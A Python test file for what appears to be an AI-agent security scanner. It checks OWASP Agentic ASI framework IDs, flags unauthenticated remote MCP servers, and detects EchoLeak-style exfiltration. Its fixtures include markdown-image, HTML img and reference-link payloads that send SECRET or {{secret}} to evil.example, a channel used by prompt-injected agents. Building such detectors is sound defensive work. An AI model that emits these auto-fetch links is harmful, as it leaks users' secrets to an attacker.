"""Tests for detections added from the daily research digest (2026-08-03).

1. Official OWASP Agentic ASI01-ASI10 framework IDs.
2. AFW-MCP-003 — remote MCP server without authentication.
3. AFW-NET-007 — EchoLeak-style auto-fetch exfiltration channel.
"""
import json
import os

from agentfirewall import Scanner
from agentfirewall import frameworks as F
from agentfirewall import loaders
from agentfirewall.models import Artifact, ScannedFile
from agentfirewall.rules.signatures import NETWORK
from agentfirewall.rules.structural import PermissionOverreachRule

EXAMPLES = os.path.join(os.path.dirname(__file__), "..", "examples")


# ------------------------------- 1. ASI IDs -------------------------------- #
def test_agentic_constants_use_official_asi_ids():
    assert F.AGENTIC_GOAL_HIJACK.startswith("OWASP-ASI01")
    assert F.AGENTIC_TOOL_MISUSE.startswith("OWASP-ASI02")
    assert F.AGENTIC_PRIVILEGE_COMPROMISE.startswith("OWASP-ASI03")
    assert F.AGENTIC_RCE.startswith("OWASP-ASI05")
    assert F.AGENTIC_MEMORY_POISONING.startswith("OWASP-ASI06")


def test_backcompat_aliases_map_to_asi():
    assert F.AGENTIC_INTENT_MANIPULATION == F.AGENTIC_GOAL_HIJACK
    assert F.AGENTIC_IDENTITY_SPOOFING == F.AGENTIC_PRIVILEGE_COMPROMISE


def test_agency_findings_cite_asi05_rce():
    result = Scanner().scan_path(os.path.join(EXAMPLES, "vulnerable-agent-app"))
    refs = {r for f in result.findings for r in f.references}
    assert any(r.startswith("OWASP-ASI05") for r in refs)
    assert any(r.startswith("OWASP-ASI") for r in refs)


# ------------------------------- 2. AFW-MCP-003 ---------------------------- #
def _mcp_ids(cfg: dict):
    art = Artifact(name="t", root="", kind="mcp",
                   files=[ScannedFile("mcp.json", json.dumps(cfg), role="manifest")],
                   metadata={})
    loaders._parse_mcp(json.dumps(cfg), art)
    art.metadata["manifest_path"] = "mcp.json"
    return {f.rule_id: f for f in PermissionOverreachRule().check(art)}


def test_remote_mcp_without_auth_flagged():
    found = _mcp_ids({"mcpServers": {"s": {"type": "http", "url": "http://x.example/mcp"}}})
    assert "AFW-MCP-003" in found
    assert found["AFW-MCP-003"].severity.label == "HIGH"
    assert any("ASI03" in r for r in found["AFW-MCP-003"].references)


def test_authed_https_mcp_not_flagged():
    found = _mcp_ids({"mcpServers": {"s": {
        "type": "https", "url": "https://x.example/mcp",
        "headers": {"Authorization": "Bearer ${TOK}"}}}})
    assert "AFW-MCP-003" not in found


def test_stdio_mcp_not_flagged_for_auth():
    found = _mcp_ids({"mcpServers": {"s": {"command": "npx", "args": ["srv"]}}})
    assert "AFW-MCP-003" not in found


def test_insecure_mcp_example_blocks():
    result = Scanner().scan_path(os.path.join(EXAMPLES, "insecure-mcp"))
    ids = {f.rule_id for f in result.findings}
    assert "AFW-MCP-003" in ids
    assert result.verdict.value == "block"


# ------------------------------- 3. AFW-NET-007 ---------------------------- #
def _net_ids(text, role="doc", path="x.md"):
    art = Artifact(name="t", root="", kind="doc",
                   files=[ScannedFile(path, text, role=role)], metadata={})
    return {f.rule_id for f in NETWORK.check(art)}


def test_markdown_image_exfil_flagged():
    assert "AFW-NET-007" in _net_ids("![x](https://evil.example/log?data=SECRET)")


def test_html_img_exfil_flagged():
    assert "AFW-NET-007" in _net_ids('<img src="https://evil.example/c?d={{secret}}">')


def test_reference_style_link_exfil_flagged():
    assert "AFW-NET-007" in _net_ids("[ref]: https://evil.example/collect?d=x")


def test_plain_image_not_flagged():
    assert "AFW-NET-007" not in _net_ids("![logo](https://site.example/logo.png)")
